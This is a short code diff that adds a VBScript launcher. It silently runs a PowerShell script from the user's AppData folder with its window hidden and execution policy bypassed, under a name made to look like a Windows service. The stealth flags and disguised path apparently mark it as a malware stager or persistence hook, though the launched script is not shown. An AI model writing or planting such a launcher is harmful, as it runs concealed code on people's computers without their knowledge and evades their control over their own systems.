@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy ByPass -File ""%APPDATA%\WindowsServiceProviderMouse\WindowsServiceProviderMouse.ps1""", 0
